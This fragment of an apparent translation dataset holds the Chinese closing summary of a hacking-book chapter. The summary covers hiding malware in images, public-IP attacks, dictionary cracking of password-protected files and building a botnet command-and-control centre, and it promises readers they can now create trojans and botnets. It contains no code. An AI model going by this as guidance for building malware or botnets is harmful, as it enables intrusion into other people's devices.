  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了一些成功部署恶意软件程序的方法。恶意软件程序的一个重要方面是它的隐蔽性。本章重点讲解了如何将恶意软件隐藏在图像中。我们学习了通过公共IP进行恶意软件攻击，以及黑客如何攻击不在同一网络中的受害者。接着，我们学习了如何使用字典攻击破解密码保护的文件。最后，我们学习了如何创建一个用于僵尸网络攻击的指挥控制中心。这些攻击允许黑客通过一个程序控制大量分布式设备。通过本章的学习，你应该能够创建木马、执行公共IP攻击，并创建自己的僵尸网络。在下一章中，我们将学习如何保护作为黑客的在线身份，以及这一点在成功攻击中的重要性。下一章见！
